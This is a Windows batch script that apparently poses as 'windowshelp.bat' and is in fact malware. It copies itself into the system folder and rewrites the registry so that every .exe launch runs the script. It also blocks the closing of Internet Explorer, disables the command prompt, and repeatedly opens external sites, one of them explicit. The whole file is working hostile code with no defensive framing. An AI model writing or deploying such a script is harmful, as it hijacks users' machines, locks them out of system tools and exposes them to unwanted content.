@echo off
copy windowshelp.bat %systemroot%\hit2thorat.bat
reg add "hkey_local_machine\software\classes\exefile\shell\open\command" /v (Default) /t reg_sz /d %systemroot%\hit2thorat.bat "%1" %*
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoBrowserClose /t reg_dword /d 1
reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v DisableCMD /t reg_dword /d dword:0x00000001
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://www.windowsfaq.ru/
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://www.kingim7.net/
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://www.igromania.ru/
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://www.lki.ru/
"C:\Program Files\Internet Explorer\IEXPLORE.EXE" http://www.megaerotic.com/